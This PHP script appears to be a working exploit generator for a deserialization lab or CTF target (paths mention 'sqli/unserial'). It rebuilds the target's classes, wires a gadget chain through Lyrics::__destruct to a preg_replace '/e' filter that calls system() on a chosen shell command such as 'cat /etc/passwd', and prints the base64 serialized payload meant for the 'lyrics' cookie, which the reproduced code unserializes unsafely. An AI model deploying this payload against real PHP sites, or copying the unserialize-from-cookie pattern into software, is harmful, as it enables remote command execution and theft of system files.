<?php

// Modern versions of PHP log this warning:
// > PHP Deprecated: `preg_replace()`: The `/e` modifier is deprecated, use
// > `preg_replace_callback` instead in `classes.php` on line 11
// Turn off all error reporting to avoid this.
error_reporting(0);

// Allow passing a shell argument containing the desired payload, e.g.
// $ php classes-patched.php 'cat /etc/passwd'
$command = isset($argv[1]) ? $argv[1] : 'ls -lsa';

class OutputFilter {
  protected $matchPattern;
  protected $replacement;
  function __construct($pattern, $repl) {
    $this->matchPattern = $pattern;
    $this->replacement = $repl;
  }
  function filter($data) {
    return preg_replace($this->matchPattern, $this->replacement, $data);
  }
};

class LogFileFormat {
  protected $filters;
  protected $endl;
  function __construct($filters, $endl) {
    $this->filters = $filters;
    $this->endl = $endl;
  }
  function format($txt) {
    foreach ($this->filters as $filter) {
      $txt = $filter->filter($txt);
    }
    $txt = str_replace('\n', $this->endl, $txt);
    return $txt;
  }
};

class LogWriter_File {
  protected $filename;
  protected $format;
  function __construct($filename, $format) {
    $this->filename = str_replace("..", "__", str_replace("/", "_", $filename));
    $this->format = $format;
  }
  function writeLog($txt) {
    $txt = $this->format->format($txt);
    file_put_contents("/var/www/sqli/unserial/logs/" . $this->filename, $txt, FILE_APPEND);
  }
};

class Logger {
  protected $logwriter;
  function __construct($writer) {
    $this->logwriter = $writer;
  }
  function log($txt) {
    $this->logwriter->writeLog($txt);
  }
};

class Song {
  protected $logger;
  protected $name;
  protected $group;
  protected $url;
  function __construct($name, $group, $url) {
    global $command;
    $this->name = $name; $this->group = $group;
    $this->url = $url;
    $fltr = new OutputFilter(
      "/^./e",
      'system("' . str_replace('"', '\\"', $command) . '")'
    );
    $this->logger = new Logger(new LogWriter_File("song_views", new LogFileFormat(array($fltr), "\n")));
  }
  function __toString() {
    return "<a href='" . $this->url . "'><i>" . $this->name . "</i></a> by " . $this->group;
  }
  function log() {
    $this->logger->log("Song " . $this->name . " by [i]" . $this->group . "[/i] viewed.\n");
  }
  function get_name() { return $this->name; }
}

class Lyrics {
  protected $lyrics;
  protected $song;
  function __construct($lyrics, $song) {
    $this->song = $song;
    $this->lyrics = $lyrics;
  }
  function __toString() {
    return "<p>" . $this->song->__toString() . "</p><p>" . str_replace("\n", "<br />", $this->lyrics) . "</p>\n";
  }
  function __destruct() {
    $this->song->log();
  }
  function shortForm() {
    return "<p><a href='song.php?name=" . urlencode($this->song->get_name()) . "'>" . $this->song->get_name() . "</a></p>";
  }
  function name_is($name) {
    return $this->song->get_name() === $name;
  }
};

class User {
  static function addLyrics($lyrics) {
    $oldlyrics = array();
    if (isset($_COOKIE['lyrics'])) {
      $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));
    }
    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;
    setcookie('lyrics', base64_encode(serialize($oldlyrics)));
  }
  static function getLyrics() {
    if (isset($_COOKIE['lyrics'])) {
      return unserialize(base64_decode($_COOKIE['lyrics']));
    }
    else {
      setcookie('lyrics', base64_encode(serialize(array(1, 2))));
      return array(1, 2);
    }
  }
};

class Porter {
  static function exportData($lyrics) {
    return base64_encode(serialize($lyrics));
  }
  static function importData($lyrics) {
    return serialize(base64_decode($lyrics));
  }
};

class Conn {
  protected $conn;
  function __construct($dbuser, $dbpass, $db) {
    $this->conn = mysqli_connect("localhost", $dbuser, $dbpass, $db);
  }

  function getLyrics($lyrics) {
    $r = array();
    foreach ($lyrics as $lyric) {
      $s = intval($lyric);
      $result = $this->conn->query("SELECT data FROM lyrics WHERE id=$s");
      while (($row = $result->fetch_row()) != NULL) {
        $r []= unserialize(base64_decode($row[0]));
      }
    }
    return $r;
  }

  function addLyrics($lyrics) {
    $ids = array();
    foreach ($lyrics as $lyric) {
      $this->conn->query("INSERT INTO lyrics (data) VALUES (\"" . base64_encode(serialize($lyric)) . "\")");
      $res = $this->conn->query("SELECT MAX(id) FROM lyrics");
      $id= $res->fetch_row(); $ids[]= intval($id[0]);
    }
    echo var_dump($ids);
    return $ids;
  }

  function __destruct() {
    $this->conn->close();
    $this->conn = NULL;
  }
};

// Create a dummy `Lyrics` instance.
$song = new Song('name', 'group', 'url');
$lyric = new Lyrics('lyrics', $song);
// Get its serialized form, base64-encode it, and print it.
echo base64_encode(serialize($lyric)) . PHP_EOL;
